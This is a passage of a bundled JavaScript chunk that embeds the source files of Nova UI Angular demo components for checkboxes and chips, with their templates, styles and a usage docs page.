SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-checkbox-link-example",\n    templateUrl: "./checkbox-link.example.component.html",\n})\nexport class CheckboxLinkExampleComponent {\n    public action(): boolean {\n        this.toastService.warning({ message: $localize`Link clicked!` });\n        return false;\n    }\n    constructor(private toastService: ToastService) {}\n}\n'},47504:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-checkbox\n    id="nui-demo-checkbox-output"\n    (valueChange)="onValueChanged($event)"\n    name="nui-checkbox-output-example"\n    i18n\n>\n    Output\n</nui-checkbox>\n'},15280:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { CheckboxChangeEvent, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-checkbox-output-example",\n    templateUrl: "./checkbox-output.example.component.html",\n})\nexport class CheckboxOutputExampleComponent {\n    constructor(private toastService: ToastService) {}\n\n    public onValueChanged($event: CheckboxChangeEvent): void {\n        this.toastService.success({\n            message: $localize`Checkbox is checked: ${$event.target.checked}`,\n        });\n    }\n}\n'},99376:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container d-flex">\n    <div id="nui-demo-checkbox-basic" class="d-flex flex-column mr-5">\n        <h4>Basic Checkbox</h4>\n        <nui-checkbox\n            [checked]="true"\n            [required]="true"\n            name="HELLO"\n            title="vfdsvf"\n        ></nui-checkbox>\n    </div>\n    <div id="nui-demo-checkbox-disabled" class="d-flex flex-column mr-5">\n        <h4>Disabled Checkbox</h4>\n        <nui-checkbox [checked]="true" [disabled]="true">Disabled</nui-checkbox>\n    </div>\n    <div id="nui-demo-checkbox-indeterminate" class="d-flex flex-column mr-5">\n        <h4>Intermediate Checkbox</h4>\n        <nui-checkbox [indeterminate]="true" [value]="true"\n            >I\'m not so sure...</nui-checkbox\n        >\n    </div>\n    <div id="nui-demo-checkbox" class="d-flex flex-column mr-5">\n        <h4>Help Hint Checkbox</h4>\n        <nui-checkbox\n            hint="This is some help text"\n            [required]="true"\n            [checked]="false"\n            >Checkbox with help text</nui-checkbox\n        >\n    </div>\n</div>\n'},80624:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-demo-checkbox-test",\n    templateUrl: "checkbox-test.component.html",\n})\nexport class CheckboxTestComponent {}\n'},8728:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <h3>States of Checkbox</h3>\n    <div class="row">\n        <div class="col-xl-2">\n            <nui-checkbox id="nui-demo-checkbox"></nui-checkbox>\n        </div>\n        <div class="col-xl-2">\n            <nui-checkbox [disabled]="true"></nui-checkbox>\n        </div>\n        <div class="col-xl-2">\n            <nui-checkbox [checked]="true"></nui-checkbox>\n        </div>\n        <div class="col-xl-2">\n            <nui-checkbox [disabled]="true" [checked]="true"></nui-checkbox>\n        </div>\n        <div class="col-xl-2">\n            <nui-checkbox [indeterminate]="true"></nui-checkbox>\n        </div>\n        <div class="col-xl-2">\n            <nui-checkbox\n                [disabled]="true"\n                [indeterminate]="true"\n            ></nui-checkbox>\n        </div>\n    </div>\n\n    <h3>States of Checkbox with Label</h3>\n    <div class="row">\n        <div class="col-xl-2">\n            <nui-checkbox id="nui-demo-checkbox-basic"> Empty </nui-checkbox>\n        </div>\n        <div class="col-xl-2">\n            <nui-checkbox\n                id="nui-demo-checkbox-basic-disabled"\n                [disabled]="true"\n            >\n                Empty - Disabled\n            </nui-checkbox>\n        </div>\n        <div class="col-xl-2">\n            <nui-checkbox id="nui-demo-checkbox-checked" [checked]="true">\n                Checked\n            </nui-checkbox>\n        </div>\n        <div class="col-xl-2">\n            <nui-checkbox\n                id="nui-demo-checkbox-checked-disabled"\n                [disabled]="true"\n                [checked]="true"\n            >\n                Checked - Disabled\n            </nui-checkbox>\n        </div>\n        <div class="col-xl-2">\n            <nui-checkbox\n                id="nui-demo-checkbox-indeterminate"\n                [indeterminate]="true"\n            >\n                Indeterminate</nui-checkbox\n            >\n        </div>\n        <div class="col-xl-2">\n            <nui-checkbox\n                id="nui-demo-checkbox-indeterminate-disabled"\n                [disabled]="true"\n                [indeterminate]="true"\n            >\n                Indeterminate - Disabled\n            </nui-checkbox>\n        </div>\n    </div>\n\n    <h3>Checkbox with a Hint</h3>\n    <nui-checkbox\n        id="nui-demo-checkbox-with-hint"\n        hint="This is some help text"\n        [checked]="true"\n    >\n        Checkbox with help text\n    </nui-checkbox>\n\n    <h3>Special Template of Checkbox</h3>\n    <nui-checkbox\n        id="nui-demo-checkbox-special"\n        hint="Toggle state - Perform link action"\n        [checked]="false"\n    >\n        Check-uncheck -\n        <a\n            href="../components/CheckboxComponent.html"\n            target="_blank"\n            class="link-in-checkbox"\n        >\n            Custom link action\n        </a>\n    </nui-checkbox>\n</div>\n'},41288:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-checkbox-visual-test",\n    templateUrl: "./checkbox-visual-test.component.html",\n})\nexport class CheckboxVisualTestComponent {}\n'},88099:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiCheckboxModule,\n    NuiDocsModule,\n    NuiMessageModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    CheckboxBasicExampleComponent,\n    CheckboxDisabledExampleComponent,\n    CheckboxExampleComponent,\n    CheckboxHelpHintExampleComponent,\n    CheckboxIndeterminateExampleComponent,\n    CheckboxInFormExampleComponent,\n    CheckboxLinkExampleComponent,\n    CheckboxOutputExampleComponent,\n    CheckboxTestComponent,\n    CheckboxVisualTestComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: CheckboxExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "checkbox-visual-test",\n        component: CheckboxVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "checkbox-test",\n        component: CheckboxTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiCheckboxModule,\n        FormsModule,\n        ReactiveFormsModule,\n        NuiMessageModule,\n        NuiButtonModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        CheckboxDisabledExampleComponent,\n        CheckboxHelpHintExampleComponent,\n        CheckboxIndeterminateExampleComponent,\n        CheckboxInFormExampleComponent,\n        CheckboxOutputExampleComponent,\n        CheckboxLinkExampleComponent,\n        CheckboxBasicExampleComponent,\n        CheckboxExampleComponent,\n        CheckboxVisualTestComponent,\n        CheckboxTestComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("checkbox"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class CheckboxModule {}\n'},88126:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./checkbox-docs/checkbox-docs.example.component";\nexport * from "./checkbox-disabled/checkbox-disabled.example.component";\nexport * from "./checkbox-helphint/checkbox-helphint.example.component";\nexport * from "./checkbox-indeterminate/checkbox-indeterminate.example.component";\nexport * from "./checkbox-basic/checkbox-basic.example.component";\nexport * from "./checkbox-in-form/checkbox-in-form.example.component";\nexport * from "./checkbox-link/checkbox-link.example.component";\nexport * from "./checkbox-visual-test/checkbox-visual-test.component";\nexport * from "./checkbox-output/checkbox-output.example.component";\nexport * from "./checkbox-test/checkbox-test.component";\n'},69020:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-chips\n    id="nui-demo-chips-autohide"\n    [autoHide]="false"\n    [itemsSource]="horizontalFlatItemsSource"\n    (chipRemoved)="onClear($event)"\n    (removeAll)="onClearAll()"\n>\n</nui-chips>\n'},65292:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport _pull from "lodash/pull";\n\nimport { IChipsItem, IChipsItemsSource } from "@nova-ui/bits";\n\nconst horizontalFlatItems: IChipsItem[] = [\n    { id: "flatId1", label: "Down" },\n    { id: "flatId2", label: "Critical" },\n    { id: "flatId3", label: "Warning" },\n    { id: "flatId4", label: "Unknown" },\n    { id: "flatId5", label: "Ok" },\n];\n\n@Component({\n    selector: "nui-autohide-chips-example",\n    templateUrl: "autohide-chips.example.component.html",\n})\nexport class AutohideChipsExampleComponent {\n    public horizontalFlatItemsSource: IChipsItemsSource = {\n        flatItems: horizontalFlatItems,\n    };\n\n    public onClear(event: { item: IChipsItem }): void {\n        console.log(`\'onClear\' event fired. $event.item.id=${event.item.id}`);\n        _pull(this.horizontalFlatItemsSource.flatItems || [], event.item);\n    }\n\n    public onClearAll(): void {\n        this.horizontalFlatItemsSource.flatItems = [];\n    }\n}\n'},11360:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-chips\n    id="nui-demo-chips-flat-horizontal"\n    [itemsSource]="horizontalFlatItemsSource"\n    (chipRemoved)="onClear($event)"\n    (removeAll)="onClearAll()"\n>\n</nui-chips>\n'},46784:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport _pull from "lodash/pull";\n\nimport { IChipsItem, IChipsItemsSource } from "@nova-ui/bits";\n\nconst horizontalFlatItems: IChipsItem[] = [\n    { id: "flatId1", label: "Down" },\n    { id: "flatId2", label: "Critical" },\n    { id: "flatId3", label: "Warning" },\n    { id: "flatId4", label: "Unknown" },\n    { id: "flatId5", label: "Ok" },\n];\n\n@Component({\n    selector: "nui-basic-chips-example",\n    templateUrl: "./basic-chips.example.component.html",\n})\nexport class BasicChipsExampleComponent {\n    public horizontalFlatItemsSource: IChipsItemsSource = {\n        flatItems: horizontalFlatItems,\n    };\n\n    public onClear(event: { item: IChipsItem }): void {\n        console.log(`\'onClear\' event fired. $event.item.id=${event.item.id}`);\n        _pull(this.horizontalFlatItemsSource.flatItems || [], event.item);\n    }\n\n    public onClearAll(): void {\n        this.horizontalFlatItemsSource.flatItems = [];\n    }\n}\n'},40072:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h3>Standalone chips</h3>\n<div id="standalone-chips" class="mb-5">\n    <nui-chip\n        *ngFor="let chip of standaloneChips"\n        [item]="chip"\n        [customClass]="chip.customClass"\n        ><nui-icon\n            *ngIf="chip.icon"\n            [icon]="chip.icon"\n            iconSize="small"\n            class="mr-1"\n        ></nui-icon>\n        {{ chip.label }}\n    </nui-chip>\n</div>\n\n<h3>nui-chips Group set</h3>\n<nui-chips\n    id="nui-demo-chips-custom-css"\n    title="Statuses"\n    orientation="vertical"\n    customClass="nui-chips-custom-styles"\n    [itemsSource]="nuiChipsSet"\n    (chipRemoved)="onClear($event)"\n    (removeAll)="onClearAll()"\n>\n</nui-chips>\n\n<h3>Unset Width</h3>\n<div id="chips-width-example" class="mb-5">\n    <nui-chip\n        *ngFor="let chip of widthChips"\n        [item]="chip"\n        [customClass]="chip.customClass"\n    ></nui-chip>\n</div>\n'},61312:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n\n// custom styles for each of standalone `nui-chip`\n#standalone-chips {\n    .standalone-chip-custom-styles {\n        border: 1px solid;\n        margin-right: @nui-space-xxs;\n    }\n\n    .custom-chip-critical {\n        .setCssVariable(border-color, nui-color-semantic-critical);\n        .setCssVariable(background-color, nui-color-semantic-critical-bg);\n        &:hover {\n            .setCssVariable(border-color, nui-color-semantic-critical-hover);\n            .setCssVariable(background-color, nui-color-semantic-critical-bg-hover);\n        }\n    }\n\n    .custom-chip-warning {\n        .setCssVariable(border-color, nui-color-semantic-warning);\n        .setCssVariable(background-color, nui-color-semantic-warning-bg);\n        &:hover {\n            .setCssVariable(border-color, nui-color-semantic-warning-hover);\n            .setCssVariable(background-color, nui-color-semantic-warning-bg-hover);\n        }\n    }\n\n    .custom-chip-info {\n        .setCssVariable(border-color, nui-color-semantic-info);\n        .setCssVariable(background-color, nui-color-semantic-info-bg);\n        &:hover {\n            .setCssVariable(border-color, nui-color-semantic-info-hover);\n            .setCssVariable(background-color, nui-color-semantic-info-bg-hover);\n        }\n    }\n\n    .custom-chip-disabled {\n        cursor: not-allowed;\n        .setCssVariable(border-color, nui-color-disabled-secondary);\n        .setCssVariable(background-color, nui-color-disabled-secondary);\n        .setCssVariable(color, nui-color-text-disabled);\n\n        // change the color of "X" button\n        .nui-chip__value-remove svg * {\n            .setCssVariable(fill, nui-color-icon-disabled);\n        }\n\n        & > * > * {\n            cursor: not-allowed;\n        }\n    }\n}\n\n// custom styles for `nui-chips`\n#nui-demo-chips-custom-css {\n    // custom styles for `nui-chips`\n    .nui-chips-custom-styles {\n        max-width: 400px;\n        padding: @nui-space-md;\n    }\n}\n'},53752:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewEncapsulation } from "@angular/core";\nimport _pull from "lodash/pull";\n\nimport { IChipRemoved, IChipsItem, IChipsItemsSource } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-chips-custom-css-example",\n    templateUrl: "./chips-custom-css.example.component.html",\n    styleUrls: ["chips-custom-css.example.component.less"],\n    encapsulation: ViewEncapsulation.None,\n})\nexport class ChipsCustomCssExampleComponent {\n    public standaloneChips: Array<IChipsItem & any> = [\n        {\n            id: "standaloneChip1",\n            label: "Custom Critical",\n            customClass: [\n                "standalone-chip-custom-styles",\n                "custom-chip-critical",\n            ],\n            icon: "severity_critical",\n        },\n        {\n            id: "standaloneChip2",\n            label: "Custom Warning",\n            customClass: [\n                "standalone-chip-custom-styles",\n                "custom-chip-warning",\n            ],\n            icon: "severity_warning",\n        },\n        {\n            id: "standaloneChip3",\n            label: "Custom Info",\n            customClass: ["standalone-chip-custom-styles", "custom-chip-info"],\n            icon: "severity_info",\n        },\n        {\n            id: "statusGroupItem5",\n            label: "Disabled",\n            customClass: [\n                "standalone-chip-custom-styles",\n                "custom-chip-disabled",\n            ],\n            icon: "severity_unknown",\n        },\n    ];\n\n    public nuiChipsSet: IChipsItemsSource = {\n        flatItems: [\n            {\n                id: "flatId2",\n                label: "Critical",\n                customClass:\n                    "nui-tag-critical nui-tag-with-hover-styles nui-tag-text-light",\n            },\n            {\n                id: "flatId3",\n                label: "Warning",\n                customClass: "nui-tag-warning nui-tag-with-hover-styles",\n            },\n            {\n                id: "flatId4",\n                label: "Info",\n                customClass:\n                    "nui-tag-info nui-tag-with-hover-styles nui-tag-text-light",\n            },\n            {\n                id: "flatId5",\n                label: "Ok",\n                customClass:\n                    "nui-tag-ok nui-tag-with-hover-styles nui-tag-text-light",\n            },\n        ],\n        groupedItems: [\n            {\n                id: "statusGroupId",\n                label: "Grouped Statuses",\n                items: [\n                    {\n                        id: "statusGroupItem2",\n                        label: "Critical",\n                        customClass:\n                            "nui-tag-critical nui-tag-with-hover-styles nui-tag-text-light",\n                    },\n                    {\n                        id: "statusGroupItem3",\n                        label: "Warning",\n                        customClass:\n                            "nui-tag-warning nui-tag-with-hover-styles",\n                    },\n                    {\n                        id: "statusGroupItem4",\n                        label: "Unknown",\n                    },\n                    {\n                        id: "statusGroupItem5",\n                        label: "Ok",\n                        customClass:\n                            "nui-tag-ok nui-tag-with-hover-styles nui-tag-text-light",\n                    },\n                ],\n            },\n        ],\n    };\n\n    public widthChips: Array<IChipsItem & any> = [\n        {\n            id: "widthChip1",\n            label: "Chip with default width and very very very very very very very long title ",\n        },\n        {\n            id: "widthChip2",\n            label: "Chip with unset width and a very very very very very very very long title ",\n            customClass: "unlimited-width",\n        },\n    ];\n\n    public onClear(event: IChipRemoved): void {\n        const source = event.group\n            ? this.nuiChipsSet.groupedItems?.find(\n                  (group) => group.id === event.group?.id\n              )?.items\n            : this.nuiChipsSet.flatItems;\n        _pull(source || [], event.item);\n    }\n\n    public onClearAll(): void {\n        this.nuiChipsSet.flatItems = [];\n        this.nuiChipsSet.groupedItems = [];\n    }\n}\n'},94732:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiChipsModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    To implement basic <code>nui-chips</code> you need to pass\n    <code>[itemsSource]</code> property to <code>nui-chips</code>. As it has\n    flat data structure you need to pass your array of items to\n    <code>flatItems</code> key of your itemsSource object because it has\n    <a href="../interfaces/IChipsItemsSource.html#source" target="_blank"\n        >IChipsItemsSource</a\n    >\n    type. Also you need to pass method to <code>(chipRemoved)</code> output\n    which will handle removing chips and some other functionality if you need\n    it.\n</p>\n<p>\n    Another thing is that by default there is a link which says "Clear All" and\n    by clicking it you can remove all the chips. To make that happen pass method\n    to <code>(removeAll)</code> output and clear your itemsSource.You can modify\n    the link text by setting the <code>[removeAllLinkText]</code> input, or you\n    can turn the feature off by passing false to the\n    <code>[allowRemoveAll]</code> input.\n</p>\n<nui-example-wrapper filenamePrefix="basic-chips" exampleTitle="Basic Usage">\n    <nui-basic-chips-example></nui-basic-chips-example>\n</nui-example-wrapper>\n<h2>Grouped Data</h2>\n<p>\n    Implementing chips with grouped data is similar to implementing basic\n    <code>nui-chips</code> with flat data. You need to pass data as an array of\n    <a href="../interfaces/IChipsGroup.html#source" target="_blank"\n        >IChipsGroup</a\n    >\n    and set the <code>(chipRemoved)</code> output and\n    <code>(removeAll)</code> if you need it.\n</p>\n<nui-example-wrapper filenamePrefix="grouped-chips" exampleTitle="Grouped Data">\n    <nui-grouped-chips-example></nui-grouped-chips-example>\n</nui-example-wrapper>\n<h2>Vertical Orientation</h2>\n<p>\n    Implementing vertical chips is the same as implementing horizontal, you only\n    need to pass additional properties such as\n    <code>orientation="vertical"</code> and <code>[title]</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="vertical-flat-chips"\n    exampleTitle="Vertical Flat Data"\n>\n    <nui-vertical-flat-chips-example></nui-vertical-flat-chips-example>\n</nui-example-wrapper>\n<nui-example-wrapper\n    filenamePrefix="vertical-grouped-chips"\n    exampleTitle="Vertical Grouped Data"\n>\n    <nui-vertical-grouped-chips-example></nui-vertical-grouped-chips-example>\n</nui-example-wrapper>\n<h2>Autohide</h2>\n<p>\n    You can reserve space for the component when the itemsSource is empty by\n    passing <code>[autoHide]="false"</code> so that when the itemsSource is\n    empty then there will remain some space at the position where component was.\n    Default value is true.\n</p>\n<nui-example-wrapper filenamePrefix="autohide-chips" exampleTitle="Autohide">\n    <nui-autohide-chips-example></nui-autohide-chips-example>\n</nui-example-wrapper>\n\n<h2>Overflow</h2>\n<p>\n    This example shows how to handle chips overflow by adding a counter at the\n    end of the second row, which indicates the number of chips which are\n    overflowed instead of creating a new row. For that, you need to add\n    <code>#overflowCounterLabel</code> which marks the area with counter and\n    popover for incorporating it into <code>nui-chips</code> as Content\n    Projection. Set property <code>overflow</code> to <code>true</code> and add\n    handler for the <code>chipsOverflowed</code> Output to get overflowed items.\n    Set overflowed items to the new property which would be as data source of\n    overflowed chips for the <code>nui-chips-overflow</code> component. Add a\n    <code>nui-chips-overflowed__counter</code> class with styles for counter\n    (see inside chips-overflow.example.component.ts file)<code\n        >overflowLinesNumber</code\n    >\n    is used for limitation of chips rows, 1 by default. You can change it for\n    you own needs.\n</p>\n\n<nui-example-wrapper filenamePrefix="chips-overflow" exampleTitle="Overflow">\n    <nui-chips-overflow-example></nui-chips-overflow-example>\n</nui-example-wrapper>\n\n<h2>Custom Css</h2>\n<p>To use custom styling for chips use <code>customClass</code> property.</p>\n<p>\n    You can do that for separate <code>nui-chip</code>,\n    <code>nui-chips</code> set or <code>nui-chips</code> group.\n</p>\n<p>\n    It\'s also possible to use\n    <a href="../additional-documentation/nova-styles/tag.html" target="_blank"\n        >Nui Tag</a\n    >\n    classes width styles for chips. To do that, just pass the related style to\n    <code>customClass</code>.\n</p>\n<p>\n    To unset <code>max-width</code> on the chip, pass\n    <code>unlimited-width</code> to <code>customClass</code>.\n</p>\n<nui-example-wrapper filenamePrefix="custom-css" exampleTitle="Custom Css">\n    